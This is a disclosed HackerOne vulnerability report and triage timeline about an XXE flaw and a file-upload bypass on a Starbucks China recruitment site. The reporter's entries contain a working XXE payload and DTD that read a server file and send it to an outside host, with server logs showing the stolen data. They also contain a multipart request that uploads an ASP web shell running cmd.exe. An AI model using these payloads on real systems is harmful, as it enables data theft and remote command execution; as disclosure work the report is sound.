---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/xml-external-entities-xxe
  - env/web
substate: "resolved"
weakness: "XML External Entities (XXE)"
enriched: true
date: 2019-11-13
submitted: 2019-02-24T15:49:52.803Z
bounty_usd: null
votes: 320
cve: []
program: "[[programs/starbucks|Starbucks]]"
reporter: "johnstone"
source: "https://hackerone.com/reports/500515"
title: "XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx"
---
# XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 320 | **Program:** Starbucks | **Disclosed:** 2019-11-13

- Report: [https://hackerone.com/reports/500515](https://hackerone.com/reports/500515)
- CWE: XML External Entities (XXE)
- Submitted: 2019-02-24T15:49:52.803Z

## Report summary

johnstone discovered that both ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx & ecjobs.starbucks.com.cn/recruitjob/hxpublic_v6/hxdynamicpage6.aspx page and were vulnerable to an XML External Entities (XXE) attack.
@johnstone — thank you for reporting this vulnerability and your additional efforts to confirm the resolution.

## Timeline

- **2019-02-24** @johnstone: hi  HackerOne Security Analysts. thank you for  validate my report.
- **Report Filed**
- **2019-02-24** @johnstone: Considering that upload vulnerabilities could lead to more threats,So I reported it first.
- **2019-02-25** @johnstone: >POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_f6a34da9-3846-4a19-bf6c-a824751dc854.xml HTTP/1.1
>Host: ecjobs.starbucks.com.cn

the xml files code
><?xml version="1.0" encoding="UTF-8" standalone="no"?>
><!DOCTYPE a [<!ENTITY % xxe SYSTEM "http://mypoorlife.club:18883/test/1.dtd"> %xxe;]>

the '1.dtd' file code
><!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
><!ENTITY % x '<!ENTITY &#37; send SYSTEM "http://mypoorlife.club:18883/test/1.asp?id=%file;">'> %x;%send;

and the evil server fetch web_logs 
>2019-02-25 09:19:44 192.168.19.240 GET /test/1.dtd - 18883 - 120.136.132.0 - 200 0 0 62
>2019-02-25 09:19:44 192.168.19.240 GET /test/1.asp id=;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1 18883 - 120.136.132.0 - 200 0 0 109

{F429768}
- **2019-02-25** @h1_analyst_leon: Hey @johnstone - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
- **Report Needs More Info**
- **Report New**
- **Report Title Updated**
- **Report Severity Updated**
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **2019-02-26** @h1_analyst_leon: Thank you @johnstone! I was able to validate your report and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and if/when a fix will be implemented. Please note that the status and severity are subject to change.
- **2019-02-26** @johnstone: Thank you @tuxedo .
- **Report Triaged**
- **2019-02-27** @johnstone: Thanks @coldbr3w
- **2019-03-03** @johnstone: hello @coldbr3w @tuxedo ,I found the vulnerabilities is still exits,is there any progress in this report?is this report eligible for  bounty?Looking forward to your reply.
With kind regards
John stone
- **2019-03-07** @johnstone: hi guys.I have been paying attention to the reported vulnerability points these days. I found that the reported XXE vulnerability has been fixed, but I found that in the avatar upload page, you can bypass the upload file limit by adding a space after the file type. I can upload asp. /aspx and other dynamic files.It's more serious than XXE vulerability,attacker can run malicious cmd on the server.
Reproduce:
1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.
2. Use burp suite tools to interupt the avatar upload request.
3. Replace the post informations with belowed .

```
-----------------------------41184676334
Content-Disposition: form-data; name="txtUploadFile"; filename="i_can_upload_aspfile_by_space.asp "
Content-Type: image/png

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c whoami").stdout.readall%>
</textarea>
</body>
</html>
```

Looking forward.
With kind regards
John stone
- **2019-03-07** @coldbr3w: Hi @johnstone 

Thank you for bringing this new issue to our attention. Please submit a separate report so that we can triage and respond accordingly. 

This site is not one listed in our In scope assets within our policy so it is not eligible for a bounty at the moment. However, once resolved, you will still benefit from the points here on HackerOne.
- **2019-03-07** @johnstone: Thks @coldbr3w i will submit a new report soon.
With kind regards
John stone
- **2019-03-10** @johnstone: hi @coldbr3w ,i have been submit a new report of this vulnerability(https://hackerone.com/report/506646) .can you check it?
Thks,with kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Agreed On Going Public**
- **2019-04-01** @shadegrown: Hi @johnstone,

I think we may have had a miscommunication with the team in China here, and I don't believe we ever got clarification from you or them that the XXE issue is actually resolved. Can you please confirm whether you're still able to reproduce the XXE? I'm going to continue to investigate on our end to see if I can repro the bug as well.

Thanks!
@shadegrown
- **2019-04-02** @johnstone: Hi@shadegrown.Do you find some issues information of the endpoint?Can you shared?I will try to test the endpoint again.
Thks
Best regards
@johnstone
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Hi @shadegrown ,I was try to repro the XXE vulnerability on the endpoint these days,Although i guess the XXE vulnerability isn't fix clean,but i don't really find some valid information to repro the vulnerability.here is my progress of repro.
When you want to find XXE vulnerability,I think two important points is necessary.
1.Users can add/modify the xml data and post it to the server.
2.The server can identify xml format and parse dtd.
So i try to test the endpoint frist.
``/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;jpeg;png;bmp;``
I found some potential risk on upload functionaly via delete the ``allow_file_type_list parameter``like xml/doct/xls/cgi etc,which i have been Mentioned in #506646 reports.
{F462221}
Then i replace the ``_hxpage`` parameter value to ``temp_uploaded_c540d606-dceb-4254-a800-45b58af5164c.xml `` that i uploaded,the server response the error information.
{F462222}
replace the ``_hxpage`` like doc/xls file etc,the server response the same error information,i guess the server did't determine whether it is valid according to the ``_hxpage`` parameter content of the file.It seems to just determine the file name value whether it is valid.
Second test way is replace the UUID to the ``hx_page_param_uuid``
{F462220}
when user uploaded the file,the server will modify the file name like ``temp_uploaded_c540d606-dceb-4254-a800-45b58af5164c.xml ``  replace the ``c540d606-dceb-4254-a800-45b58af5164c`` to the ``hx_page_param_uuid`` parameter value,the server response the error information too.
Maybe I lost some  key steps for repro. Looking forward to your suggestions.
Best reguards!
Thank you~
@johnstone
- **Bounty Awarded**
- **2019-04-05** @johnstone: Thank you @shadegrown ：）
 Best regards
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
